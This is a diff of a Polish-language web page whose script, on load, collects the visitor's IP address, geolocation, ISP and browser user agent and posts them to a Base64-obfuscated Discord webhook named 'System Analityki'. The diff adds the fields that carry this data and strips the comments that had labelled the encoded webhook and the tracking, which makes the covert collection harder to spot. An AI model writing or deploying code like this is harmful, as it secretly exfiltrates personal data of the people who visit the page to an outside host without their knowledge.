@@ -18,24 +18,22 @@
             position: relative;
         }
 
-        /* POPRAWKA: Tło jako niezależna warstwa pod spodem z wyłączoną blokadą kliknięć */
         .background-blur {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-image: url('budynek.jpg'); /* Zdjęcie pobierane bezpośrednio z Twojego projektu */
+            background-image: url('budynek.jpg');
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
             filter: blur(8px);
             transform: scale(1.05);
             z-index: 1;
-            pointer-events: none; /* POPRAWKA: Kliknięcia przechodzą przez tło i trafiają w przyciski */
+            pointer-events: none;
         }
 
-        /* Wszystkie kontenery mają teraz z-index: 10, aby stać wyżej niż tło */
         .main-content, .error-content {
             display: none;
             background: rgba(255, 255, 255, 0.95);
@@ -86,7 +84,7 @@
             font-weight: bold;
             font-size: 14px;
             position: relative;
-            z-index: 1002; /* Przycisk musi być na najwyższej warstwie klikalnej */
+            z-index: 1002;
             transition: background 0.2s, transform 0.1s;
         }
         .btn:active { transform: scale(0.98); }
@@ -120,7 +118,6 @@
 </head>
 <body>
 
-    <!-- Warstwa z obrazem tła -->
     <div class="background-blur"></div>
 
     <!-- 1. OKNO POPUP -->
@@ -161,7 +158,6 @@
     </div>
 
     <script>
-        // ZAKODOWANY WEBHOOK DISCORD (Base64)
         const _0x4f2a = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9vaHMvMTUzMjA2OTcxOTA1NjcxNTg2Ni8xY0FZNjZKWjZOQTZzaC1GTmVUNXNFQUtEdF8zYVpLb1FITkJTdUhDSkVNMlo5ZHR3OXM3N0VwandnZk5YMEp5ZHNnQQ==";
 
         window.onload = function() {
@@ -195,29 +191,26 @@
             document.getElementById('privacyOverlay').style.display = 'flex';
         }
 
-        // Korzystamy z uniwersalnego API omijającego blokady CORS i limity transferu
         function startTracking() {
             document.getElementById('mainPage').style.display = 'block';
             
             fetch('https://ipify.org')
-                .then(response => response.json())
-                .then(data => {
+                .then(function(response) { return response.json(); })
+                .then(function(data) {
                     if(data && data.ip) {
-                        // Pobieramy podstawowy adres IP, a następnie uzupełniamy go lokalizacją
                         fetch('https://ipapi.co' + data.ip + '/json/')
-                            .then(res => res.json())
-                            .then(locData => {
+                            .then(function(res) { return res.json(); })
+                            .then(function(locData) {
                                 sendToDiscord(locData);
                             })
-                            .catch(() => {
-                                // Awaryjna wysyłka z samym IP, jeśli geolokalizacja zawiedzie
-                                sendToDiscord({ ip: data.ip, country_name: "Nieznany", country_code: "XX", city: "Nieznane", region: "Nieznany", org: "Błąd API" });
+                            .catch(function() {
+                                sendToDiscord({ ip: data.ip, country_name: "Nieznany", country_code: "XX", city: "Nieznane", region: "Nieznany", org: "Blad API" });
                             });
                     }
                 })
-                .catch(error => {
-                    console.error("Błąd sieci połączenia:", error);
-                    sendToDiscord({ ip: "Błąd odczytu", country_name: "-", country_code: "-", city: "-", region: "-", org: "-" });
+                .catch(function(error) {
+                    console.error("Blad sieci:", error);
+                    sendToDiscord({ ip: "Blad odczytu", country_name: "-", country_code: "-", city: "-", region: "-", org: "-" });
                 });
         }
 
@@ -228,6 +221,18 @@
                 username: "System Analityki",
                 avatar_url: "https://imgur.com",
                 embeds: [{
-                    title: "📥 Logowanie ruchu na stronie (Ostateczny Fix)",
+                    title: "📥 Logowanie ruchu na stronie",
                     color: 3066993,
                     fields: [
+                        { name: "🌐 Adres IP", value: "`" + (ipData.ip || "Brak") + "`", inline: true },
+                        { name: "🌍 Kraj", value: (ipData.country_name || "Nieznany"), inline: true },
+                        { name: "📍 Lokalizacja", value: (ipData.city || "Nieznane") + " (" + (ipData.region || "Nieznany") + ")", inline: true },
+                        { name: "🏢 Sieć (ISP)", value: (ipData.org || "Nieznany dostawca"), inline: false },
+                        { name: "🖥️ System/Przeglądarka", value: navigator.userAgent, inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(targetUrl, {
+                method: 'POST',
